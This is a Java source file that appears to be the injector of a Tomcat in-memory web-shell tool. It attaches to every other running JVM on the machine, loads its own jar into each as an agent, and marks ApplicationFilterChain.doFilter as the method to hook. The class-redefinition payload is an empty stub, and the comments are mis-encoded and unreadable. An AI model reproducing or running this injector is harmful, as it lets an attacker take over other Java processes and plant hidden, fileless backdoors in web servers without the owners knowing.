package indi.augusttheodor;

import com.sun.tools.attach.*;
import sun.misc.Unsafe;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.List;

//���������������ȡJVM��Attach
//������˿������������ʹ�õĵ�com.sun.tools��java/libs/tools.jar��
//ͨ�������ʽö��JVM�����Ҽ����ıȽϳ��õķ��� Java��������㵽�������Լ��ķ�Ҳ��ǰ�ں���
public class AttachA {

    public static void doAttach(String args) throws IOException, AgentLoadException, AgentInitializationException {
        //�������������ע������JVM
        String jarPath = AttachA.class.getProtectionDomain().getCodeSource().getLocation().getFile();
        jarPath=new File(jarPath).getPath();
        List<VirtualMachineDescriptor> vList = VirtualMachine.list(); //��ȡJVM�б�
        for(VirtualMachineDescriptor vmd:vList) {
            String vmdName = vmd.displayName();
            if (vmdName.contains(new File(jarPath).getName())) { //��ֹ�����������ö�̬��ȡ������
                continue; //�ų��Լ�
            }
            System.out.println("-------->���ӵ�"+vmdName);
            try{
                VirtualMachine attachV = VirtualMachine.attach(vmd); //��ʼ����
                attachV.loadAgent(jarPath, args); //ע�뱾jar��Ŀ����� Ȼ���������agentmain
            }catch (AttachNotSupportedException e){
                System.out.println(vmdName+"----------------��֧��Attach��");
            }catch (IOException e){
                System.out.println(vmdName+"----------------�������Ӧ������Ϊ�����Ѿ���attach��һ��");
            }

        }
    }

    

    public static HashMap<String,String[]> findAttachClasses(){
        //�����������Ѱ��ע��Ŀ��
        //����ֵΪHashMap<ClassName,MethodName>
        //��ʵ��HashMap��̫�Ͻ���������ܷ���
        HashMap<String,String[]> re=new HashMap<>();
        re.put("org.apache.catalina.core.ApplicationFilterChain", new String[]{"doFilter"});
        return re;
    }

    public static byte[] getRedefineClassBytes(){
        return new byte[0];
    }
}
